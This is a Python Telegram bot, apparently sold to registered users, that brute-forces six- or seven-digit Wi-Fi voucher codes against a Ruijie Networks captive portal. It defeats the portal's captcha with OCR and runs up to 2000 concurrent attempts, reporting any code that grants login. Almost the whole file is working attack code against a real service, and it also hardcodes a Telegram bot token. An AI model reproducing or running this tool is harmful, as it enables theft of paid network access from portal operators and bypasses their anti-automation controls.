import telebot, asyncio, aiohttp, json, random, re, os, string, time, uuid
from telebot.async_telebot import AsyncTeleBot
from aiohttp import web
import ddddocr
from datetime import datetime, timedelta, timezone

BOT_TOKEN = '8742216295:AAHLKP262FLXFeHTIeqdlceMBRbXJBwsvTc'
ADMIN_ID = "8728200516"
SUCCESS_CODE = asyncio.Queue()
bot = AsyncTeleBot(BOT_TOKEN)
user_data, approve, scan_tasks, success_texts, retry_counts = {}, {}, {}, {}, {}
_voucher_sem = None
_start_time = time.monotonic()

AUTH_FILE = "auth_list.json"
RESULT_FILE = "result.json"

def load_json(f):
    if not os.path.exists(f): return {}
    try:
        with open(f, "r", encoding="utf-8") as file: return json.load(file)
    except: return {}

def save_json(f, data):
    with open(f, "w", encoding="utf-8") as file: json.dump(data, file, indent=4)

if not os.path.exists(AUTH_FILE): save_json(AUTH_FILE, {})
if not os.path.exists(RESULT_FILE): save_json(RESULT_FILE, {})

async def handle(request):
    return web.Response(text="Running 24/7")

async def web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    await web.TCPSite(runner, '0.0.0.0', int(os.environ.get('PORT', 8099))).start()

@bot.message_handler(commands=['start'])
async def start(message):
    await bot.reply_to(message, "Bot စတင်ပါပြီ။ /key ဖြင့်စတင်ပါ။")

@bot.message_handler(commands=['key'])
async def handle_key(message):
    global approve
    key = str(message.chat.id)
    auth_list = load_json(AUTH_FILE)
    if key in auth_list:
        approve[message.chat.id] = True
        user_data[message.chat.id] = {}
        await bot.reply_to(message, " Key မှန်ကန်ပါသည်။ /input ဖြင့် Session URL ထည့်ပါ။")
    else:
        await bot.reply_to(message, " သင်၏ key ကို registered မလုပ်ရသေးပါ။")

@bot.message_handler(commands=['genkey'])
async def genkey(message):
    if str(message.chat.id) != ADMIN_ID: return
    args = message.text.split()
    if len(args) < 3: return
    plan, user_id = args[1], args[2]
    expiry = (datetime.now(timezone.utc) + timedelta(days=365)).isoformat()
    auth_list = load_json(AUTH_FILE)
    auth_list[user_id] = {"expires_at": expiry, "plan": plan}
    save_json(AUTH_FILE, auth_list)
    await bot.reply_to(message, f" Key Generated\nUSER ID : {user_id}\nPLAN : {plan}")

@bot.message_handler(commands=['input'])
async def handle_input(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2: return
    if message.chat.id in user_data:
        user_data[message.chat.id]['session_url'] = args[1]
        await bot.reply_to(message, "Session URL သိမ်းဆည်းပြီးပါပြီ။ /scan <6, 7, 8> ဖြင့်စတင်ပါ။")

@bot.message_handler(commands=['scan'])
async def scan(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2: return
    chat_id = message.chat.id
    if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, "Session URL အရင်ထည့်ပါ။")
        return
    msg = await bot.send_message(chat_id, "🔍 Scanning Codes...")
    asyncio.create_task(run_bruteforce(args[1], chat_id, user_data[chat_id]['session_url'], msg))

async def run_bruteforce(mode, chat_id, session_url, progress_msg):
    global _voucher_sem
    if _voucher_sem is None: _voucher_sem = asyncio.Semaphore(2000)
    codes = [str(i).zfill(int(mode)) for i in range(10 ** int(mode))] if mode in ["6", "7"] else []
    for code in codes:
        async with _voucher_sem:
            if await perform_check(session_url, code):
                await bot.send_message(chat_id, f"✅ Success Code Found: {code}")
                break

async def perform_check(session_url, code):
    post_url = 'https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US'
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(session_url, allow_redirects=True) as req:
                sid_match = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url))
                if not sid_match: return False
                sid = sid_match.group(1)
            
            async with session.get(f"https://portal-as.ruijienetworks.com/api/auth/captcha?sessionId={sid}") as resp:
                img = await resp.read()
            
            ocr = ddddocr.DdddOcr(show_ad=False)
            txt = ocr.classification(img)
            
            async with session.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', json={'sessionId': sid, 'authCode': txt}) as r:
                if not (await r.json()).get("success"): return False

            async with session.post(post_url, json={"accessCode": code, "sessionId": sid, "apiVersion": 1, "authCode": txt}) as r:
                if 'logonUrl' in await r.text(): return True
        except: pass
    return False

async def main():
    asyncio.create_task(web_server())
    await bot.infinity_polling()

if __name__ == '__main__':
    asyncio.run(main())
